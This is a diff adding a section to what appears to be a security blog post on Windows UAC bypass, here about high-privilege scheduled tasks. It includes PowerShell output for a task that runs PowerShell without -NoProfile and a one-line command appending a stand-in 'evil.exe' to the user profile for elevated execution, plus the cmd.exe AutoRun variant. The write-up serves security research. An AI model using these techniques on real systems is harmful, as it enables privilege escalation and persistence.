@@ -200,3 +200,31 @@ For exploitation purposes, note that the OS will still pop-up a UAC prompt unles
 
 I talked about [injection](https://github.com/yo-yo-yo-jbo/injection_and_hooking_intro/) and the [PEB](https://github.com/yo-yo-yo-jbo/msf_shellcode_analysis/) in past posts, so I won't discuss them too much. You can find PEB spoofing implementations all around the internet, [this](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1) is a good place to start.
 
+## Auto-elevated tasks
+Sometimes you might find scheduled tasks that run with high privileges, but triggerable from a non-elevated user.  
+Those tasks might suffer from the same issues we've seen previously (registry poisoning, environment variable poisoning, path dependencies and others).  
+Here's on example I found:
+
+```powershell
+PS C:\>(Get-ScheduledTask -TaskName "Update-Internal").Principal.RunLevel
+Highest
+PS C:\>(Get-ScheduledTask -TaskName "Update-Internal").Actions
+
+Id               :
+Arguments        : -windowstyle hidden -nonInteractive -nologo -ExecutionPolicy unrestricted -Command
+                   "& Start-Process -WindowStyle Hidden -PassThru -FilePath \"C:\Program
+                   Files\InternalUpdater\UpdCheck.ps1"
+Execute          :
+WorkingDirectory : C:\Program Files\InternalUpdater
+PSComputerName   :
+```
+
+This scheduled task runs `PowerShell` without the `-NoProfile` flag!  
+Profiles are stored in a writable directory, and therefore can be easily infected:
+
+```powershell
+echo "C:\temp\evil.exe" >> $profile
+```
+
+Note that `cmd.exe` without the `/d` flag has a similar property (this time using the `HKCU` registry path `HKCU\Software\Microsoft\Command Processor\AutoRun`)!
+
